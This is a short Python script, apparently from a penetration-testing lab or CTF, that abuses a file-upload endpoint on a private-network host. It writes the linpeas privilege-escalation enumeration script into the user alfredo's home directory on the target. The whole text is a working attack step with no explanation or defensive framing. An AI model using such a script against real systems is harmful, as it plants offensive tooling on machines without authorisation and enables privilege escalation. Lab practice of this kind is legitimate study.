import requests

myurl = 'http://192.168.217.249:33414/file-upload'
files = {'file': open('/home/dotwut/Tools/linpeas.txt', 'rb')}
filename = {'filename': '/home/alfredo/linpeas.sh'}


getdata = requests.post(myurl, files=files, data=filename)
print(getdata.text)